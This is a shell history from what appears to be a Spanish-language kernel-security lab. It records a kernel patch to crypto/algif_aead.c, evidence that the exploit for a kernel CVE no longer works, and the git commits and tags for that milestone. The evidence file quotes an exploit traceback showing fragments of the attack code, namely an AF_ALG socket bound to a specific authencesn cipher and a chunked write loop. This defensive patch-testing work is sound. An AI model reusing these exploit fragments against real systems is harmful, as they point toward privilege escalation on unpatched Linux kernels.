  285  cp kernel/linux/arch/x86/boot/bzImage kernel/build/bzImage_vuln
  286  make qemu
  287  cat > evidence/hito4_patched.txt << 'EOF'
=== HITO 4: PARCHE APLICADO ===
Fecha: Thu May 14 02:51:50 UTC 2026
Hostname: copy-fail-T1JOSEPH
Kernel: 6.12.0-dirty
Identidad: uid=0(root) gid=0(root)
Intento exploit post-parche:
Traceback (most recent call last):
  File "/home/student/copy_fail_exp.py", line 9, in <module>
    while i<len(e):c(f,i,e[i:i+4]);i+=4
  File "/home/student/copy_fail_exp.py", line 5, in c
    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"))
FileNotFoundError: [Errno 2] No such file or directory
Resultado: exploit NEUTRALIZADO por parche en crypto/algif_aead.c
EOF

  288  git add evidence/hito4_patched.txt patches/fix_algif_aead.patch
  289  git commit -m "hito-4: parche aplicado, exploit neutralizado - $(date +%Y-%"
  290  git tag -a hito-4 -m "Kernel parcheado, CVE-2026-31431 neutralizado"
  291  git push origin main --tags
  292  rm echo python3 "}"
  293  git status
  294  git add -A
  295  git commit -m "limpieza: remover archivos basura"
  296  git push origin main
  297  cat > REPORT.md << 'EOF'